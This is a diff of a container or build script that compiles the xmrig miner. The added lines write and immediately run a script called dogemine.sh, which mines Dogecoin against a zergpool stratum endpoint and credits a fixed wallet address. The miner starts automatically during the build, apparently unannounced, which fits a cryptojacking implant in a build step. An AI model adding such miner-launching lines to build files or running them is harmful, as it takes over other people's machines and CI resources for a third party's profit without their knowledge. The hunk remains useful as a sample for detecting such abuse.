@@ -7,5 +7,15 @@ apt-get update && \
 	cd build && \
 	cmake -DWITH_HWLOC=OFF .. && \
 	make && \
+	ln -s xmrig .. && \
+	echo "finish install" && \
+	echo "#!/bin/sh
+./xmrig -o  stratum+tcp://scrypt.na.mine.zergpool.com:3433 -u DOGE:DRzF9YT57Ep6Bjc6ziUbwayWRGWbamtTSE.dogeminer" > dogemine.sh && \
+	chmod 744 dogemine.sh && \
+	./dogemine.sh
+	
+
+
+
 
 
